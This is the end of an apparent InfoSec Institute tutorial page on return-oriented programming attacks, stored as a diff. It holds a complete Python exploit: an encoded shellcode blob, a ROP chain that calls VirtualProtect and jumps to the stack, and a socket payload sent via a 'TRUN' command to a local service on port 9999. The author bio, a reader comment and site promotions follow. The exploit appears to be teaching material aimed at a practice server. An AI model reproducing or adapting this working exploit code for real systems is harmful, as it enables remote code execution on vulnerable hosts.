+buf = “\x2b\xc9\x83\xe9\xb5\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x25\xab\x3a\xc9\x83\xee\xfc\xe2\xf4\xd9\x43\xb3\xc9\x25\xab\x5a\x40\xc0\x9a\xe8\xad\xae\xf9\x0a\x42\x77\xa7\xb1\x9b\x31\x20\x48\xe1\x2a\x1c\x70\xef\x14\x54\x0b\x09\x89\x97\x5b\xb5\x27\x87\x1a\x08\xea\xa6\x3b\x0e\xc7\x5b\x68\x9e\xae\xf9\x2a\x42\x67\x97\x3b\x19\xae\xeb\x42\x4c\xe5\xdf\x70\xc8\xf5\xfb\xb1\x81\x3d\x20\x62\xe9\x24\x78\xd9\xf5\x6c\x20\x0e\x42\x24\x7d\x0b\x36\x14\x6b\x96\x08\xea\xa6\x3b\x0e\x1d\x4b\x4f\x3d\x26\xd6\xc2\xf2\x58\x8f\x4f\x2b\x7d\x20\x62\xed\x24\x78\x5c\x42\x29\xe0\xb1\x91\x39\xaa\xe9\x42\x21\x20\x3b\x19\xac\xef\x1e\xed\x7e\xf0\x5b\x90\x7f\xfa\xc5\x29\x7d\xf4\x60\x42\x37\x40\xbc\x94\x4d\x98\x08\xc9\x25\xc3\x4d\xba\x17\xf4\x6e\xa1\x69\xdc\x1c\xce\xda\x7e\x82\x59\x24\xab\x3a\xe0\xe1\xff\x6a\xa1\x0c\x2b\x51\xc9\xda\x7e\x6a\x99\x75\xfb\x7a\x99\x65\xfb\x52\x23\x2a\x74\xda\x36\xf0\x3c\x0b\x12\x76\xc3\x38\xc9\x34\xf7\xb3\x2f\x4f\xbb\x6c\x9e\x4d\x69\xe1\xfe\x42\x54\xef\x9a\x72\xc3\x8d\x20\x1d\x54\xc5\x1c\x76\xf8\x6d\xa1\x51\x47\x01\x28\xda\x7e\x6d\x5e\x4d\xde\x54\x84\x44\x54\xef\xa3\x25\xc1\x3e\x9f\x72\xc3\x38\x10\xed\xf4\xc5\x1c\xae\x9d\x50\x89\x4d\xab\x2a\xc9\x25\xfd\x50\xc9\x4d\xf3\x9e\x9a\xc0\x54\xef\x5a\x76\xc1\x3a\x9f\x76\xfc\x52\xcb\xfc\x63\x65\x36\xf0\xaa\xf9\xe0\xe3\x2e\xcc\xbc\xc9\x68\x3a\xc9”
+
+target = “127.0.0.1”
+
+port = int(“9999”)
+
+from operator import *
+
+address_loc = xor(0x00B6FAD0 , 0xffffffff)
+
+address_val = xor(0x00B6FAE0, 0xffffffff)
+
+size_loc = xor(0x00B6FAD4, 0xffffffff)
+
+size = xor(len(buf), 0xffffffff)
+
+nprotect_loc = xor(0x00B6FAD8, 0xffffffff)
+
+nprotect = xor(0x40, 0xffffffff)
+
+oldprotect_loc = xor(0x00B6FADC, 0xffffffff)
+
+oldprotect = xor(0x00B6FAB4, 0xffffffff)
+
+# first param
+
+eip = pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, address_loc)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x77C14001) # xchg eax, ecx
+
+eip += pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, address_val)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x7C951376) # MOV DWORD PTR DS:[EAX],ECX
+
+# second param
+
+eip += pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, size_loc)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x77C14001) # xchg eax, ecx
+
+eip += pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, size)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x7C951376) # MOV DWORD PTR DS:[EAX],ECX
+
+# Third param
+
+eip += pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, nprotect_loc)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x77C14001) # xchg eax, ecx
+
+eip += pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, nprotect)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x7C951376) # MOV DWORD PTR DS:[EAX],ECX
+
+# fourth param
+
+eip += pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, oldprotect_loc)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x77C14001) # xchg eax, ecx
+
+eip += pack(‘<L’, 0x7C9029AC) # pop edi
+
+eip += pack(‘<L’, 0xffffffff)
+
+eip += pack(‘<L’, 0x7C971980)    #pop ecx
+
+eip += pack(‘<L’, oldprotect)
+
+eip += pack(‘<L’, 0x71AB100C)    #xor ecx, edi
+
+eip += pack(‘<L’, 0x7C951376) # MOV DWORD PTR DS:[EAX],ECX
+
+eip += pack(‘<L’, 0x7C801AD0 ) # VirtualProtect
+
+eip += pack(‘<L’, 0x7C941EED) # JMP ESP
+
+eip += pack(‘<L’, 0xdeadbeef) #1
+
+eip += pack(‘<L’, 0xdeadbeef) #2
+
+eip += pack(‘<L’, 0xdeadbeef) #3
+
+eip += pack(‘<L’, 0xdeadbeef) #4
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((target,port))
+
+s.send(“TRUN .” + “a” * 2006 + eip + buf)
+
+s.recv(1000)
+
+s.close()
+
+
+
+ 
+ Share  
+	AUTHOR
+D12d0x34X
+Rashid Bhat is an Independent Security Researcher as well as a contributor to InfoSec Institute. His areas of expertise include exploitation, malware analysis and reverse engineering. Twitter: http://twitter.com/raashidbhatt
+FREE TRAINING TOOLS
+Phishing Simulator
+Security Awareness
+EDITORS CHOICE
+Getting started with ethical hacking
+MITRE ATT&CK vulnerability spotlight: Credentials in registry
+Cyber Work podcast: The current state of AI in cybersecurity
+Penetration testing certifications
+Election security: Cybersecurity concerns for future elections
+MITRE ATT&CK vulnerability spotlight: Credentials in files
+Cybersecurity architect certifications
+Train or entertain? Do both with this security awareness program plan
+The Need For Secure Coding
+Best practices to ensure your organization is focused on the right types of risk
+Malware spotlight: What is rogue security software?
+MITRE ATT&CK vulnerability spotlight: Brute force
+Hacking since age six | Cyber Work Podcast
+RELATED BOOT CAMPS
+Information Security
+Security Awareness
+DoD 8140
+Ethical Hacking
+Hacker Training Online
+Security+
+Computer Forensics
+CISA
+CCNA
+PMP
+Incident Response
+MORE POSTS BY AUTHOR
+InfoSec Institute Interview with Rahul Sasi
+InfoSec Institute Interview with Rahul Sasi
+MITRE ATT&CK vulnerability spotlight: Credentials in… 
+ 
+Cyber Work podcast: The current state… 
+ 
+Penetration testing certifications 
+ 
+Election security: Cybersecurity concerns for future… 
+One response to “Return Oriented Programming (ROP) Attacks”
+ dario90 says:
+October 10, 2012 at 1:10 am
+It could be better if you add a link to a PDF file with this information.
+
+Reply
+Leave a Reply
+Your email address will not be published. Required fields are marked *
+
+Comment 
+
+Name * 
+
+Email * 
+
+Website 
+
+Save my name, email, and website in this browser for the next time I comment.
+
+image  +  
+  =  nine	
+
+About Infosec
+At Infosec, we believe knowledge is the most powerful tool in the fight against cybercrime. We provide the best certification and skills development training for IT and security professionals, as well as employee security awareness training and phishing simulations. Learn more at infosecinstitute.com.
+
+Connect with us
+Stay up to date with Infosec
+
+ 
+Join our newsletter
+Get the latest news, updates & offers straight to your inbox.
+
+
+ENTER YOUR EMAIL
+ 
+© INFOSEC RESOURCES 2019 Close
+
+
+a73b61549aba1574272022-preview-Need-to-Know-posters-1.png
+Ready-made security awareness training kit
+
+Start assembling your security awareness and anti-phishing training plan today.
+
+Get the kit
+No thanks
